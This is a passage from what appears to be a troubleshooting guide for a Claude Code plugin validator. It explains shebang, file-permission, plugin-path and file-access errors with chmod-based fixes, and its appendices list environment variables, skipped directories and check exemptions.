Add a shebang as the very first line:
```bash
#!/usr/bin/env bash
```
Or for maximum portability:
```bash
#!/bin/sh
```

---

### 10.4 Non-Standard Shebang (INFO)

**Error message:** `Shell script has non-standard shebang: <shebang_line>`

**Severity:** INFO

**Root cause:** A `.sh` file has a shebang that does not reference `bash` or `sh` (e.g., `#!/usr/bin/env python3` in a `.sh` file).

**Fix steps:**
- If the file is actually a Python/other script, change its extension to match (`.py`, etc.).
- If it is a shell script, fix the shebang to reference `bash` or `sh`.

---

### 10.5 Python Script World-Writable (CRITICAL)

**Error message:** `Python script is world-writable: <path>`

**Severity:** CRITICAL

**Root cause:** A `.py` file has world-writable permissions, allowing any system user to modify it.

**Fix steps:**
```bash
chmod o-w <path>
chmod 644 <path>   # rw-r--r--
```

---

### 10.6 Cannot Check Script Permissions (MAJOR)

**Error message:** `Cannot check script permissions: <path> (<error_details>)`

**Severity:** MAJOR

**Root cause:** The validator encountered an `OSError` or `PermissionError` when trying to `stat()` or read the script file. This may indicate file corruption, broken symlinks, or restrictive permissions.

**Fix steps:**
1. Check if the file exists and is accessible:
   ```bash
   ls -la <path>
   ```
2. Fix permissions if needed:
   ```bash
   chmod 644 <path>
   ```
3. If the file is a broken symlink, either fix the symlink target or remove it.

---

## 11. Plugin Path Validation Issues

### 11.1 Plugin Path Does Not Exist (CRITICAL)

**Error message:** `Plugin path does not exist: <path>`

**Severity:** CRITICAL

**Root cause:** The path provided to the validator does not exist on the filesystem.

**Fix steps:**
1. Verify the path is correct.
2. Check for typos in the path.
3. Ensure the plugin directory has been created.

---

### 11.2 Plugin Path Is Not a Directory (CRITICAL)

**Error message:** `Plugin path is not a directory: <path>`

**Severity:** CRITICAL

**Root cause:** The path provided to the validator exists but is a file, not a directory.

**Fix steps:**
Provide the path to the plugin's root directory, not to a specific file within it.

---

## 12. File Access Issues

### 12.1 Cannot Read File (MINOR)

**Error message:** `Cannot read file: <path> (<error_details>)`

**Severity:** MINOR

**Root cause:** The validator encountered an `OSError` or `PermissionError` when attempting to read a file's contents. This occurs in both encoding and security scanning.

**Fix steps:**
1. Check file permissions:
   ```bash
   ls -la <path>
   ```
2. Fix read permissions:
   ```bash
   chmod +r <path>
   ```
3. If the file should not be in the plugin, remove it and add it to `.gitignore`.

---

## Appendix: Environment Variables for Plugins

Plugins must use these environment variables instead of hardcoded paths:

| Variable | Description | Available In |
|---|---|---|
| `CLAUDE_PLUGIN_ROOT` | Plugin's root directory | All plugin hooks |
| `CLAUDE_PROJECT_DIR` | Project root directory | All hooks |
| `CLAUDE_ENV_FILE` | Write export statements to persist env vars | SessionStart/Setup only |
| `CLAUDE_CODE_REMOTE` | Set to `"true"` in remote web environments | Remote only |

## Appendix: Directories Skipped During Scanning

The following directories are always skipped by all validators (SKIP_DIRS):

`.ruff_cache`, `.mypy_cache`, `.git`, `__pycache__`, `.venv`, `node_modules`, `.pytest_cache`, `.tox`, `dist`, `build`, `*.egg-info`

Additional directories skipped for private info scanning (PRIVATE_INFO_SKIP_DIRS adds):

`venv`, `target`, `.eggs`, `docs_dev`, `scripts_dev`, `tests_dev`, `examples_dev`, `samples_dev`, `downloads_dev`, `libs_dev`, `builds_dev`

## Appendix: Files Exempt from Certain Checks

| Check | Exempted File Types |
|---|---|
| Command substitution injection | Shell scripts (`.sh`, `.bash`, `.zsh`, `.ksh`), markdown (`.md`, `.mdx`, `.markdown`), test files (`test_*`, `*_test.py`, `*/tests/*`) |
| All injection checks | Validator scripts (`validate_*.py`, `cpv_validation_common.py`) |
| Path traversal | Validator scripts, markdown documentation, test files, comment lines, shebang lines |
| User path detection | Validator scripts, markdown documentation, test files |
| Absolute path check (doc allowlist) | Documentation files (`.md`, `.txt`, `.html`, `.rst`, `.adoc`) -- allowed prefixes only |
| Absolute path scanning | `cpv_validation_common.py` is always skipped (contains patterns as data constants) |
